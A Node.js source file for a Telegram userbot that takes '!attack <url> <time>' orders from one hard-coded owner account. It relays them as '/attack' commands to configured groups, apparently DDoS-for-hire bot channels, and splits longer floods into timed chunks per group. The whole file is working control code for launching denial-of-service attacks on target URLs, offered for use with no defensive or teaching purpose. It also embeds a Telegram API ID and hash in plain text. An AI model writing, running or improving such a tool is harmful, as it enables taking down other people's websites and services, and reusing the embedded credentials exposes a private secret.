const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const input = require('input');
const fs = require('fs');
const path = require('path');

// Telegram API Credentials
const apiId = 29802545;
const apiHash = '81529c7337dd45830593100dc72d7b10';

const SESSION_FILE = path.join(__dirname, 'session.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');

// Load session
let sessionString = '';
if (fs.existsSync(SESSION_FILE)) {
    try {
        const data = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8'));
        sessionString = data.session || '';
    } catch (e) {
        console.error('Failed to load session:', e.message);
    }
}

// Load userbot config
function loadConfig() {
    try {
        return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
    } catch (e) {
        return { groups: [], methodMap: {}, commandTemplate: '/attack {target} {groupMethod}' };
    }
}

const stringSession = new StringSession(sessionString);
let _client = null;
const activeGroupAttacks = new Set();

/**
 * Fitur Utama: Broadcast Attack ke Grup Telegram (Restored)
 */
async function sendAttackToGroups(target, method, time) {
    if (!_client) return;

    const cfg = loadConfig();
    const enabledGroups = (cfg.groups || []).filter(g => g.enabled);
    if (enabledGroups.length === 0) return;

    for (const group of enabledGroups) {
        (async () => {
            try {
                const methodMap = group.methodMap || {};
                const hasMapEntries = Object.keys(methodMap).length > 0;
                const isMethodMapped = method.toLowerCase() in methodMap;

                if (hasMapEntries && !isMethodMapped) {
                    console.log(`[\x1b[33mUserbot\x1b[0m] Method "${method}" skipped for group ${group.description || group.id}`);
                    return;
                }

                const groupMethod = methodMap[method.toLowerCase()] || method.toUpperCase();
                const template = group.commandTemplate || '/attack {target} {groupMethod} {time}';
                const maxTime = group.maxTime || 120;
                
                let remainingTime = parseInt(time) || 60;
                
                // Parse peer and topic ID
                let peer = group.username || group.id;
                let replyTo = undefined;

                if (peer && typeof peer === 'string' && peer.includes('/')) {
                    const [p, t] = peer.split('/');
                    peer = p;
                    replyTo = parseInt(t);
                }

                // Convert to BigInt if it's a numeric ID
                if (peer && /^-?\d+$/.test(peer.toString())) {
                    peer = BigInt(peer);
                }
                
                if (!peer) return;

                const peerKey = group.username || group.id;
                
                if (activeGroupAttacks.has(peerKey)) {
                    console.log(`[\x1b[33mUserbot\x1b[0m] [${group.description || peerKey}] is currently busy. Ignoring new attack to prevent spam.`);
                    return;
                }

                activeGroupAttacks.add(peerKey);

                try {
                    const totalTime = remainingTime;
                    console.log(`[\x1b[35mUserbot\x1b[0m] [${group.description || peer}${replyTo ? ` Topic ${replyTo}` : ''}] Starting chain for ${totalTime}s...`);

                    while (remainingTime > 0) {
                        const currentAttackTime = Math.min(remainingTime, maxTime);
                        const command = template
                            .replace('{target}', target)
                            .replace('{groupMethod}', groupMethod)
                            .replace('{time}', currentAttackTime);

                        const sent = await _client.sendMessage(peer, { message: command, replyTo: replyTo });
                        console.log(`[\x1b[35mUserbot\x1b[0m] [\x1b[35m${group.description || group.username || group.id}\x1b[0m] Shot: \x1b[1m${currentAttackTime}s\x1b[0m | \x1b[32mSuccess\x1b[0m`);

                        // Auto-delete and auto-rename have been removed as requested

                        remainingTime -= currentAttackTime;
                        if (remainingTime > 0) {
                            await new Promise(resolve => setTimeout(resolve, (currentAttackTime + 2) * 1000));
                        }
                    }
                } finally {
                    // Release the lock when the chain is done or if it errors out
                    activeGroupAttacks.delete(peerKey);
                }
            } catch (err) {
                console.error(`[\x1b[31mUserbot Error\x1b[0m] ${err.message}`);
            }
        })();
    }
}

async function initUserbot() {
    console.log('[\x1b[36mUserbot\x1b[0m] Initializing...');

    const client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });

    await client.start({
        phoneNumber: async () => await input.text('Please enter your number: '),
        password: async () => await input.text('Please enter your password: '),
        phoneCode: async () => await input.text('Please enter the code you received: '),
        onError: (err) => console.log(err),
    });

    const me = await client.getMe();
    _client = client;

    console.log(`[\x1b[32mUserbot\x1b[0m] Connected as ${me.firstName} (@${me.username || 'n/a'})`);
    fs.writeFileSync(SESSION_FILE, JSON.stringify({ session: client.session.save() }, null, 2));

    const OWNER_ID = BigInt("8334467338"); // Akun kedua yang diizinkan

    let lastMsgId = 0;

    // Ambil ID pesan terakhir sebagai baseline
    try {
        const dialogs = await client.getDialogs({ limit: 15 }); // Ambil lebih banyak dialog untuk cache
        const history = await client.getMessages(OWNER_ID, { limit: 1 });
        if (history && history.length > 0) lastMsgId = history[0].id;
        console.log(`[\x1b[34mUserbot\x1b[0m] Starting from message ID: ${lastMsgId}`);
    } catch(e) { /* ignore */ }

    console.log(`[\x1b[32mUserbot\x1b[0m] Message polling started (every 3s)...`);

    setInterval(async () => {
        try {
            const messages = await client.getMessages(OWNER_ID, { limit: 5, minId: lastMsgId });
            if (!messages || messages.length === 0) return;

            for (const msg of messages.reverse()) {
                if (!msg || !msg.message || msg.out) continue;
                if (msg.id <= lastMsgId) continue;

                lastMsgId = msg.id;
                const text = msg.message;
                const lowerText = text.toLowerCase();

                console.log(`[\x1b[34mUserbot\x1b[0m] New msg from Owner: ${text.substring(0, 50)}`);

                // !ping
                if (lowerText === '!ping') {
                    const start = Date.now();
                    await client.sendMessage(OWNER_ID, { message: `**PONG!** \`${Date.now() - start}ms\``, parseMode: 'markdown', replyTo: msg.id });
                    continue;
                }

                // !attack
                if (lowerText.startsWith('!attack ')) {
                    const parts = text.split(' ');
                    if (parts.length < 3) { await client.sendMessage(OWNER_ID, { message: 'Format: `!attack <url> <time>`', parseMode: 'markdown', replyTo: msg.id }); continue; }
                    await client.sendMessage(OWNER_ID, { message: '🚀 Broadcasting...', replyTo: msg.id });
                    sendAttackToGroups(parts[1], 'hfree', parts[2]);
                    continue;
                }

            }
        } catch(e) {
            if (!e.message.includes('FLOOD') && !e.message.includes('Could not find the input entity')) {
                console.error(`[\x1b[31mUserbot Poll Error\x1b[0m]`, e.message);
            }
        }
    }, 3000);

    global.userbotSendAttack = sendAttackToGroups;
}

module.exports = { initUserbot, sendAttackToGroups };
